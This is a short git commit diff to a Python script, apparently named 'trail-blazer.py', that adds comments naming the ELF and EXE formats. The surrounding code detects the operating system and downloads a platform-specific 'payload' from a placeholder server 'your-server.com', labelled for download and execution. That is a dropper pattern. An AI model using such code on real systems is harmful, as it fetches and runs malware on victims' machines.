c127e66b016c19fa2796e16666dd5c7e76e9c8e9
rf-peixoto <50427765+rf-peixoto@users.noreply.github.com>
2021-06-05 22:42:30 -0300

    Update trail-blazer.py

--- Source/trail-blazer.py
+++ Source/trail-blazer.py
@@ -6,9 +6,9 @@ import requests
 platform_os = platform.system()
 # Set Filename to Download and Execcute:
 if platform_os == "Linux":
-    filename = "Linux Executable Name"
+    filename = "Linux Executable Name" #ELF: Executable and Linkable Format
 elif platform_os == "Windows":
-    filename = "Windows Exe Name.exe"
+    filename = "Windows Exe Name.exe" #EXE: Executable
 
 # Download:
 data = requests.get("http://your-server.com/payload_path/{0}".format(filename))
